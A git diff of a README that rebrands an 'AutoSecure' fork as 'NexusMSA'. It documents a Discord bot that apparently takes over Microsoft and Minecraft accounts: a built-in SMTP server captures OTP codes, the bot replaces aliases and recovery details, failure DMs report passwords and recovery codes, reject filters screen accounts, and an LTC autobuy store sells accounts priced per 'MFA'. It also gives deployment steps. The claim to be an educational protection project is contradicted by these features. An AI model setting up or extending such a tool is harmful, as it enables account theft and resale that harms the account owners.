@@ -1,45 +1,40 @@
-# AutoSecure (fork)
+# NexusMSA — Microsoft Account Security Toolkit
 
-Fork of [saldevsautosec/autosecure](https://github.com/saldevsautosec/autosecure) — maintained by [waitno01/autosecure](https://github.com/waitno01/autosecure).
+Microsoft account securing automation for Discord. Request-based, headless — no Selenium or Playwright. Built-in SMTP server, web dashboard, and autobuy flow.
 
-Request-based Microsoft account securing for Discord, with a built-in SMTP server and web dashboard. No Selenium or Playwright.
+**Maintainer: [RomeoXLover](https://github.com/RomeoXLover)** — this is the authoritative fork. All active development, bug fixes, and feature work lives here.
 
 ---
 
 ## Disclaimer
 
-Use at your own risk. Automating Microsoft account flows may violate Microsoft's Terms of Service. This software is for educational purposes. The fork maintainers and upstream authors are not responsible for account actions taken by Microsoft or third parties.
-This repository is a small cybersecurity project focused on Microsoft account security and automation. It contains several scripts that explore ways to improve account protection, including setting up two-factor authentication (2FA) and checking for possible security issues.
+Use at your own risk. Automating Microsoft account flows may violate Microsoft's Terms of Service. This software is for educational purposes. The maintainer and upstream authors are not responsible for account actions taken by Microsoft or third parties.
+
+This repository is a cybersecurity project focused on Microsoft account security and automation. It contains scripts that explore ways to improve account protection, including setting up two-factor authentication (2FA) and checking for possible security issues.
 
 The project was made mainly for learning and experimentation. It can be used by students, researchers, and people interested in cybersecurity to get a better idea of how account security works and how different security measures can help keep accounts and personal information safe.
 
-## Fork changes
+---
 
-This fork adds fixes and features on top of upstream:
+## Project layout
 
-| Area | Change |
-|------|--------|
-| **Mail** | Built-in Discord webhook forwarding + OTP detection (no separate `smtp-discord` needed) |
-| **Mail** | Optional playtime OTP bridge (`mail.otp_bridge_url` in config) |
-| **Securing** | Failure DMs include security email, password, and recovery code when recovery already ran |
-| **Securing** | Lock/suspended/phone-locked detection before and during secure (uses `/check locked` API) |
-| **Securing** | Bedrock / Game Pass accounts without a Java profile handled without crashing |
-| **Securing** | Safer embed building (missing subscription/cape fields, partial success embeds) |
-| **Dashboard** | Delete accounts from list + database |
-| **Ops** | PM2 `ecosystem.config.cjs` for bot, API, and web |
-| **Ops** | `setup.sh` for venv, web build, and PM2 start |
-
-### Recent updates (2026-07-16)
-
-| Area | Change |
-|------|--------|
-| **Game Pass filter** | Rejects only **active** Xbox Game Pass / Ultimate. Expired, canceled, and Realms/M365 upsell noise no longer false-positive as Game Pass. |
-| **Autobuy hold** | Default credit hold **12h**; **Client+** role hold **3h** (`client_plus_role_id` / `client_plus_pending_hours`). |
-| **Hold checks** | Split schedule: security-email pullback every **1h** (masked GetCredentialType, no password/OTP); Microsoft lock check every **6h**. |
-| **CatB / overprotective** | Xbox SSO `proofs/Verify?mpcxt=CATB` completes via security-email OTP (SendOtt → VerifyProof, often 2 rounds), then `proofs/remind` with **Looks good**. Fixes false “No Minecraft” when Skip loops. |
-| **Cookies / canary** | `get_cookies` no longer crashes on missing `apiCanary` — securing continues into MC check instead of aborting mid-flow. |
-
-Upstream Discord invite and original docs are not affiliated with this fork.
+| Directory | Purpose |
+|-----------|---------|
+| `authsecuring/` | Core MSA securing orchestration (`orch.py`), auth flows, security operations |
+| `authsecuring/utils/` | Cookie handling, proxy transport, login, security information |
+| `authsecuring/utils/security/` | 2FA, password, recovery, proof, alias, device operations |
+| `authsecuring/utils/ogi/` | Microsoft OGI API wrappers (subscriptions, family, cards, contacts) |
+| `commands/` | All Discord slash command cogs (replaces `cogs/`) |
+| `views/` | Discord UI components — buttons and modals |
+| `inbox/` | Built-in SMTP server + OTP detection + Discord forwarding |
+| `store/` | LTC autobuy store — wallet, payouts, credits |
+| `mc/` | Minecraft profile, SSID, capes, gamertag, name-change lookups |
+| `tools/` | Shared utilities — TOTP, links, embeds, email, logging |
+| `storage/` | SQLite database layer (`solis_db.py`) |
+| `panel/` | React + TypeScript web dashboard |
+| `config/` | `bot_settings.json` (runtime) + `runtime.json` (commands/embeds/presence) |
+| `logs/` | Application log files |
+| `database/*.db` | SQLite database files (auto-created) |
 
 ---
 
@@ -47,14 +42,12 @@ Upstream Discord invite and original docs are not affiliated with this fork.
 
 - [Requirements](#requirements)
 - [Setup (step by step)](#setup-step-by-step)
-- [Example config files](#example-config-files)
 - [Configuration reference](#configuration-reference)
-- [Email & DNS](#email--dns)
+- [Email & DNS](#-email--dns)
 - [Running with PM2](#running-with-pm2)
 - [Web dashboard](#web-dashboard)
 - [Bot commands](#bot-commands)
 - [Troubleshooting](#troubleshooting)
-- [Disclaimer](#disclaimer)
 
 ---
 
@@ -75,8 +68,8 @@ Upstream Discord invite and original docs are not affiliated with this fork.
 ### 1. Clone
 
 ```bash
-git clone https://github.com/waitno01/sunnysecure.git
-cd sunnysecure   # or autosecure — folder name from clone
+git clone https://github.com/RomeoXLover/romeo-open-source-autosecure.git
+cd romeo-open-source-autosecure
 ```
 
 ### 2. Create configs from examples
@@ -123,7 +116,7 @@ In Cloudflare (or your DNS), **DNS only** (grey cloud) for mail:
 | A | `mail` | Your VPS public IP |
 | MX | `@` | `mail.yourdomain.com` (priority 10) |
 
-Open **TCP 25** inbound on the VPS firewall. Only one process should listen on port 25 (`autosecure-bot`).
+Open **TCP 25** inbound on the VPS firewall. Only one process should listen on port 25 (`nexus-bot`).
 
 ### 6. Install & build
 
@@ -133,10 +126,10 @@ python3.12 -m venv .venv          # or python3
 .venv/bin/pip install -r requirements.txt
 
 # Web dashboard
-cd web && npm install && npm run build && cd ..
+cd panel && npm install && npm run build && cd ..
 ```
 
-Or one-shot (creates `config.json` from the example if missing, then exits so you can edit it):
+Or one-shot:
 
 ```bash
 chmod +x setup.sh
@@ -150,14 +143,14 @@ chmod +x setup.sh
 pm2 start ecosystem.config.cjs
 pm2 save
 pm2 status
-pm2 logs autosecure-bot
+pm2 logs nexus-bot
 ```
 
 | Process | Port | Role |
 |---------|------|------|
-| `autosecure-bot` | 25 (SMTP) | Discord bot + mail |
-| `autosecure-api` | 8000 (localhost) | FastAPI |
-| `autosecure-web` | 3000 | Dashboard UI |
+| `nexus-bot` | 25 (SMTP) | Discord bot + mail |
+| `nexus-api` | 8000 (localhost) | FastAPI |
+| `nexus-web` | 3000 | Dashboard UI |
 
 Dashboard: `http://YOUR_VPS_IP:3000` — log in with `web.credentials`.
 
@@ -170,74 +163,6 @@ cloudflared tunnel --config cloudflared.yml run
 ```
 
 Update `CORS_ORIGINS` in `ecosystem.config.cjs` to include your public UI origin.
-
----
-
-## Example config files
-
-Shipped templates (safe to commit — placeholders only):
-
-| File | Purpose |
-|------|---------|
-| [`config/config.json.example`](config/config.json.example) | Secrets + runtime settings → copy to `config/config.json` |
-| [`config/bot.json.example`](config/bot.json.example) | Commands, embeds, presence → copy to `config/bot.json` if needed |
-| [`cloudflared.yml.example`](cloudflared.yml.example) | Cloudflare Tunnel ingress |
-| [`ecosystem.config.cjs.example`](ecosystem.config.cjs.example) | PM2 apps (bot / API / web) |
-
-Minimal `config/config.json` shape:
-
-```json
-{
-  "owners": [ YOUR_DISCORD_ID ],
-  "tokens": {
-    "bot_token": "YOUR_DISCORD_BOT_TOKEN",
-    "skytools_key": "",
-    "donut_key": ""
-  },
-  "discord": {
-    "logs_channel": "",
-    "accounts_channel": "",
-    "censored_logs_channel": ""
-  },
-  "autosecure": {
-    "replace_main_alias": true,
-    "enable_2fa": false,
-    "minecon_mode": false,
-    "reject": {
-      "family_locked": true,
-      "gamepass": true,
-      "underage": true,
-      "min_age_years": 18,
-      "require_primary_alias": true,
-      "check_donutsmp_ban": true,
-      "require_no_sms_proof": true,
-      "nfa_name_patterns": true
-    }
-  },
-  "web": {
-    "credentials": {
-      "username": "dashboard_admin",
-      "password": "REPLACE_WITH_A_LONG_RANDOM_PASSWORD",
-      "jwt_secret": "REPLACE_WITH_64_HEX_CHARS_OR_LONG_RANDOM_STRING"
-    }
-  },
-  "domain": "yourdomain.com",
-  "proxy": { "enabled": false, "proxies": [] },
-  "mail": {
-    "discord_webhook_all": "",
-    "discord_webhook_otp": "",
-    "otp_bridge_url": "",
-    "otp_bridge_token": ""
-  },
-  "autobuy": {
-    "price_per_mfa": 5.0,
-    "pending_hours": 12,
-    "hold_check_enabled": true
-  }
-}
-```
-
-Full keys (proxy formats, autobuy LTC wallet, reject filters, OTP bridge list) are in **`config/config.json.example`**.
 
 ---
 
@@ -271,11 +196,12 @@ Command toggles, aliases, embed templates, button labels, presence, and post-ver
 |---------|-----|----------|
 | Skytools | [developer.skytools.app](https://developer.skytools.app/) | Hypixel / SkyBlock stats |
 | DonutSMP | [api.donutsmp.net](https://api.donutsmp.net/index.html) | Donut stats |
+
 ---
 
 ## Email & DNS
 
-The bot runs an SMTP server on **port 25** when `autosecure-bot` starts. Mail is stored in SQLite and forwarded to Discord webhooks.
+The bot runs an SMTP server on **port 25** when `nexus-bot` starts. Mail is stored in SQLite and forwarded to Discord webhooks.
 
 ### Cloudflare DNS (DNS only / grey cloud)
 
@@ -284,7 +210,7 @@ The bot runs an SMTP server on **port 25** when `autosecure-bot` starts. Mail is
 | A | `mail` | Your VPS public IP |
 | MX | `@` | `mail.yourdomain.com` (priority 10) |
 
-Only one process should bind port 25 on the VPS (this bot — not a separate smtp-discord instance).
+Only one process should bind port 25 on the VPS (this bot — not a separate instance).
 
 ---
 
@@ -294,21 +220,21 @@ Only one process should bind port 25 on the VPS (this bot — not a separate smt
 
 | Process | Port | Role |
 |---------|------|------|
-| `autosecure-bot` | 25 (SMTP) | Discord bot + mail server |
-| `autosecure-api` | 8000 | FastAPI backend |
-| `autosecure-web` | 3000 | Dashboard (Nitro build) |
+| `nexus-bot` | 25 (SMTP) | Discord bot + mail server |
+| `nexus-api` | 8000 | FastAPI backend |
+| `nexus-web` | 3000 | Dashboard (Nitro build) |
 
 ```bash
 pm2 start ecosystem.config.cjs
-pm2 logs autosecure-bot
-pm2 restart autosecure-bot autosecure-api autosecure-web
+pm2 logs nexus-bot
+pm2 restart nexus-bot nexus-api nexus-web
 ```
 
 Update `CORS_ORIGINS` in `ecosystem.config.cjs` if you access the dashboard from a public IP or domain.
 
 ### Public access (optional)
 
-Use Cloudflare Tunnel or nginx in front of ports 3000/8000. See upstream `cloudflared.yml` if you use a tunnel.
+Use Cloudflare Tunnel or nginx in front of ports 3000/8000. See `cloudflared.yml` if you use a tunnel.
 
 ---
 
@@ -358,14 +284,12 @@ Command names can be renamed in `config/bot.json` or the dashboard.
 | Problem | What to check |
 |---------|----------------|
 | Bot won't start | Python 3.12+, venv deps, valid `bot_token`, intents enabled |
-| Port 25 in use | Stop other SMTP (`pm2 stop mail` / smtp-discord); only one listener |
+| Port 25 in use | Stop other SMTP; only one listener |
 | Emails not arriving | DNS A/MX, port 25 open, `domain` in config matches MX domain |
-| Wrong failure message on locked account | Re-pull this fork — lock detection runs before secure |
-| Rejected for Game Pass but GP expired | Re-pull — filter matches product title + active cycle only |
-| Secure stuck / false “No Minecraft” on CatB | Security email must receive OTP; bot completes Verify → remind LooksGood |
+| Wrong failure message on locked account | Lock detection runs before secure |
+| Rejected for Game Pass but GP expired | Filter matches product title + active cycle only |
+| Secure stuck / false "No Minecraft" on CatB | Security email must receive OTP; bot completes Verify → remind LooksGood |
 | Autobuy credits stuck pending | Check `hold_check_enabled` and intervals; Client+ role shortens hold |
 | Dashboard login fails | `web.credentials` in `config/config.json` |
-| `git push` goes to wrong host | `git remote set-url origin https://github.com/waitno01/autosecure.git` |
-| Web build fails on Node 20 | Run `node node_modules/vite/bin/vite.js build` inside `web/` |
-
----
+| `git push` goes to wrong host | `git remote set-url origin https://github.com/RomeoXLover/romeo-open-source-autosecure.git` |
+| Web build fails on Node 20 | Run `node node_modules/vite/bin/vite.js build` inside `panel/` |
